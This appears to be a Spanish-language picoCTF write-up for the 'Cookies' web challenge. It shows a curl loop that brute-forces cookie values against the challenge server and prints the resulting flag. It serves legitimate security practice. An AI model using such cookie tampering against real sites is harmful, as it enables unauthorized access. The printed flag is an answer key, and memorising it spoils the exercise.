# Cookies
## Objetivo
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:64944/](http://mercury.picoctf.net:64944/)
## Pistas
P1:
P2:
P3:
## Datos de acceso al nivel
```bash
Usuario: Dena
Contraseña: Notedigo
```
## Solución
```bash
Pass siguiente lvl: picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}
----------------------------------------------------------------------------------------
revisamos las cookies con cookie editor

ahora con en el shell
┌──(kali㉿kali)-[~]
└─$ for i in {0..20}; do curl -s http://mercury.picoctf.net:64944/check -H "Cookie: name=$i"; done | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}</code></p>

```
## Notas Adicionales

| Comando  | Descripción | 
|------------|--------------|

## Referencias 
https://learn.onemonth.com/web-hacking-tools-proxies/